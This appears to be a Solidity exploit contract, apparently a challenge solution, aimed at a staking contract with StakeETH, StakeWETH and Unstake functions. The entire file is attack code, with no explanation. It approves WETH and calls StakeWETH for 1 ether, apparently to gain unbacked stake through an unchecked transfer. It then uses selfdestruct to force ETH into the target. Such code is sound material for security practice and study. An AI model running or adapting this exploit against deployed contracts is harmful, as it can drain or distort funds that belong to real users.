// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
}

contract Attack {
    IStake target;
    IERC20 weth;

    constructor(address targetAddr, address wethAddr) {
        target = IStake(targetAddr);
        weth = IERC20(wethAddr);
    }

    function attack() public payable {
        // with any arbitrary msg.value
        weth.approve(address(target), 1 ether);
        target.StakeWETH(1 ether);
        selfdestruct(payable(address(target)));
    }
}
